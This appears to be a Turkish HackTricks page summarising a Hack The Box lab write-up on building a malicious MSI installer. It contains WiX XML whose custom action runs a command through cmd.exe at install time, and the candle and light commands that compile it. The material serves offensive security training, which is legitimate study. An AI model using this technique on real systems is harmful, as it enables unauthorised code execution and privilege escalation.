{{#include ../../banners/hacktricks-training.md}}

# Kötü Amaçlı MSI Oluşturma ve Root Elde Etme

MSI yükleyicisinin oluşturulması wixtools kullanılarak yapılacaktır, özellikle [wixtools](http://wixtoolset.org) kullanılacaktır. Alternatif MSI oluşturucularının denendiği, ancak bu özel durumda başarılı olunamadığı belirtilmelidir.

Wix MSI kullanım örnekleri hakkında kapsamlı bir anlayış için, [bu sayfaya](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) danışılması önerilir. Burada, wix MSI kullanımını gösteren çeşitli örnekler bulabilirsiniz.

Amaç, lnk dosyasını çalıştıracak bir MSI oluşturmaktır. Bunu başarmak için aşağıdaki XML kodu kullanılabilir ([xml buradan](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)):
```markup
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
Önemli bir nokta, Package öğesinin InstallerVersion ve Compressed gibi öznitelikler içerdiğidir; bu öznitelikler, yükleyici sürümünü belirtir ve paketin sıkıştırılıp sıkıştırılmadığını gösterir.

Oluşturma süreci, msi.xml'den bir wixobject oluşturmak için wixtools'tan candle.exe aracını kullanmayı içerir. Aşağıdaki komut çalıştırılmalıdır:
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
Ayrıca, gönderide komut ve çıktısını gösteren bir görüntü sağlandığına değinmekte fayda var. Görsel rehberlik için buna başvurabilirsiniz.

Ayrıca, wixobject'ten MSI dosyası oluşturmak için wixtools'tan başka bir araç olan light.exe kullanılacaktır. Çalıştırılacak komut aşağıdaki gibidir:
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
Önceki komutla benzer şekilde, komutu ve çıktısını gösteren bir resim gönderide yer almaktadır.

Bu özetin değerli bilgiler sağlamayı amaçladığını lütfen unutmayın, ancak daha kapsamlı detaylar ve doğru talimatlar için orijinal gönderiye başvurmanız önerilir.

## Referanslar

- [https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)
[wixtools](http://wixtoolset.org)

{{#include ../../banners/hacktricks-training.md}}
